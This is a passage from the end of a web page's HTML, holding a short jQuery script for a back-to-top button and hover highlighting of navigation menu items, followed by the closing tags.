                $backToTop_wrap.addClass("off");
            }
        });
    
        $backToTop_btn.on("click", function(){
            $("html, body").animate({ scrollTop: 0 }, 120);
        });
        
        $(function(){
            var navlist = $('.nav-list > li');
            
            navlist.each(function(){
                $(this).on('mouseenter', function(){
                    $(this).addClass('selected');
                });
                
                $(this).on('mouseleave', function(){
                    $(this).removeClass('selected');
                });
            });
        })
    </script>





</body></html>